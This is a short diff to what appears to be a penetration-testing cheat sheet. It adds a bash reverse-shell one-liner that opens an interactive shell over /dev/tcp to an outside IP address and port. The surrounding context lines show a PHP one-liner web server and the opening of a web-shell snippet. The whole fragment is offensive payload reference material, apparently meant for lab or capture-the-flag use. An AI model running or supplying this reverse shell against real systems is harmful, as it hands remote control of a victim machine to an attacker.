@@ -8,6 +8,11 @@ Open WebServer [PHP]
 php -S 0.0.0.0:<port>
 ```
 
+Bash
+```bash
+/bin/bash -c 'bash+-i >& /dev/tcp/10.10.16.16/9006 0>&1'
+```
+
 Web Shell
 ```php
 <html>
